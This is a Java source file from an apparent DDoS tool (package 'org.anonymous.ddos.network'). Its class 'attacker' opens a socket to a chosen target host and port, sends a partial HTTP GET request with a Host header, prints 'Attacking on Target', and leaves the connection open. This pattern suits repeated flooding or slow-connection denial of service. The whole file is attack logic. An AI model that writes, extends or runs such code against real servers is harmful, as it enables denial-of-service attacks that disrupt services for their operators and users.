/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package org.anonymous.ddos.network;

import java.net.Socket;
import java.math.*;
import java.rmi.*;
import java.rmi.server.*;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.net.Socket;
import java.net.UnknownHostException;
import java.util.logging.Level;
import java.util.logging.Logger;

/**
 *
 * @author user
 */
public class attacker {

    String TARGET;
    int Tport;
    
    public void Initialize(String host,int port)
    {
        TARGET=host;
        Tport=port;
    }
    
    public void attack() {

        try {
            Socket net = new Socket(TARGET, Tport); // connects the Socket to the TARGET port 80.
            sendRawLine("GET / HTTP/1.1", net); // Sends the GET / OutputStream
            sendRawLine("Host: " + TARGET, net); // Sends Host: to the OutputStream
            System.out.println("Attacking on Target  " + TARGET);
        } catch (IOException ex) {
            System.out.println("Error : "+ex);
        }

    }

    public static void sendRawLine(String text, Socket sock) {
        try {
            BufferedWriter out = new BufferedWriter(new OutputStreamWriter(sock.getOutputStream()));
            out.write(text + " ");
            out.flush();
        } catch (IOException ex) {
            ex.printStackTrace();
        }
    }
}
